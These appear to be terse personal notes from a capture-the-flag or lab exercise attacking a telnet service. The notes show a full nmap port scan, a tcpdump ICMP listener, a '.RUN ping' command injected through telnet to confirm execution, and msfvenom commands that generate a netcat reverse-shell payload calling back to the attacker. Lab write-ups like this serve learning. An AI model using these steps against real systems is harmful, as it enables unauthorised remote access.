```bash
telnet <IP> <port>
```

for all ports
```bash
nmap -p- <ip>
```

`tcpdump` listener
```bash
sudo tcpdump ip proto \\icmp -i tun0
```

inside telnet
sent 1 ping message
```
.RUN ping <my-local-ip> -c 1
```

generating reverse shell

```bash
msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R

msfvenom -p cmd/unix/reverse_netcat lhost=[ tun1 ip] lport=4444 R
```